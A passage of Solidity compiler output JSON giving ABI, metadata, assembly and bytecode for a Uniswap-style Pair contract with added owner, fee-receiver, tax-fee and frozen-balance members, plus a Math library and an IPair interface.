"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price0CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price1CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"skim\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sync\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"IPair.sol\":\"IPair\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"IPair.sol\":{\"keccak256\":\"0xdb92972f4ad91928bf2b838c35717718651f0501be334e6f30849c56fe99ff66\",\"urls\":[\"bzz-raw://e481899dee463be19aa61191acfef749034329127d372116ad504bad936f14e0\",\"dweb:/ipfs/QmeFYDk2NDiNjZt1yUDo8u1CuxYVdswc2mqWETaCzD1Cnv\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"Math.sol": {
				"Math": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"Math.sol\":115:655  library Math {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"Math.sol\":115:655  library Math {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a72315820392e8e1c83c33b3b3f9fb7322a8967719f1183b351572775248c8e3e2702931164736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820392e8e1c83c33b3b3f9fb7322a8967719f1183b351572775248c8e3e2702931164736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 CODECOPY 0x2E DUP15 SHR DUP4 0xC3 EXTCODESIZE EXTCODESIZE EXTCODEHASH SWAP16 0xB7 ORIGIN 0x2A DUP10 PUSH8 0x719F1183B3515727 PUSH22 0x248C8E3E2702931164736F6C63430005100032000000 ",
							"sourceMap": "115:540:5:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820392e8e1c83c33b3b3f9fb7322a8967719f1183b351572775248c8e3e2702931164736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 CODECOPY 0x2E DUP15 SHR DUP4 0xC3 EXTCODESIZE EXTCODESIZE EXTCODEHASH SWAP16 0xB7 ORIGIN 0x2A DUP10 PUSH8 0x719F1183B3515727 PUSH22 0x248C8E3E2702931164736F6C63430005100032000000 ",
							"sourceMap": "115:540:5:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"min(uint256,uint256)": "infinite",
								"sqrt(uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 115,
									"end": 655,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 115,
									"end": 655,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820392e8e1c83c33b3b3f9fb7322a8967719f1183b351572775248c8e3e2702931164736f6c63430005100032",
									".code": [
										{
											"begin": 115,
											"end": 655,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "ADDRESS"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "EQ"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "MSTORE"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "DUP1"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"Math.sol\":\"Math\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"Math.sol\":{\"keccak256\":\"0x9e94097dd206ec6121005eb1e67e8347a2cfca90fb7d0b599522ce2f8a36c09b\",\"urls\":[\"bzz-raw://bfa9f239f212c94f413dc5ef4f5cabc853e789519bd9610a51fd7a2ea222d8fb\",\"dweb:/ipfs/QmR1YCU8VQ28BnqeRQ9WqSwqjxLzmtJYz2KqW2XQKjP9dR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"Pair.sol": {
				"Pair": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								}
							],
							"name": "Sync",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "FeeResiver",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Lockmint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "MINIMUM_LIQUIDITY",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "_frozenBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getReserves",
							"outputs": [
								{
									"internalType": "uint112",
									"name": "_reserve0",
									"type": "uint112"
								},
								{
									"internalType": "uint112",
									"name": "_reserve1",
									"type": "uint112"
								},
								{
									"internalType": "uint32",
									"name": "_blockTimestampLast",
									"type": "uint32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "_token0",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "_token1",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "_taxfee",
									"type": "uint256"
								}
							],
							"name": "initialize",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "kLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price0CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price1CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "skim",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "sync",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "taxfee",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "_newtax",
									"type": "uint256"
								}
							],
							"name": "taxfeeupdate",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x06\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"Pair.sol\":353:395  0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x9e94ee69f3cdcd5e74e05563736e4679da6db44c\n    /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  or\n  swap1\n  sstore\n  0x01\n    /* \"Pair.sol\":1140:1165  uint private unlocked = 1 */\n  0x10\n  sstore\n    /* \"Pair.sol\":2685:2772  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:7   */\n  dup1\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  mload(0x40)\n    /* \"ERC20.sol\":1107:1114  chainid */\n  chainid\n  swap1\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"ERC20.sol\":1370:1374  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup1\n  dup5\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap5\n  dup6\n  add\n  mstore\n    /* \"ERC20.sol\":1404:1414  bytes(\"1\") */\n  dup3\n  mload\n  dup1\n  dup5\n  add\n  dup5\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup6\n  add\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  mload\n  dup1\n  dup6\n  add\n  swap3\n  swap1\n  swap3\n  mstore\n    /* \"ERC20.sol\":1354:1376  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  dup5\n  add\n  mstore\n    /* \"ERC20.sol\":1394:1415  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0x60\n  dup4\n  add\n  mstore\n  0x80\n  dup3\n  add\n  swap6\n  swap1\n  swap6\n  mstore\n    /* \"ERC20.sol\":1466:1470  this */\n  address\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xa0\n  dup1\n  dup4\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup3\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup4\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xc0\n  swap1\n  swap2\n  add\n  swap1\n  swap2\n  mstore\n    /* \"ERC20.sol\":1152:1495  keccak256(... */\n  dup1\n  mload\n  swap2\n  add\n  keccak256\n    /* \"ERC20.sol\":1133:1149  DOMAIN_SEPARATOR */\n  0x04\n    /* \"ERC20.sol\":1133:1495  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"Pair.sol\":2716:2736  factory = msg.sender */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  swap1\n  dup2\n  and\n    /* \"Pair.sol\":2726:2736  msg.sender */\n  caller\n    /* \"Pair.sol\":2716:2736  factory = msg.sender */\n  swap1\n  dup2\n  or\n  swap1\n  swap3\n  sstore\n    /* \"Pair.sol\":2747:2752  owner */\n  0x0f\n    /* \"Pair.sol\":2747:2765  owner = msg.sender */\n  dup1\n  sload\n  swap1\n  swap2\n  and\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n    /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  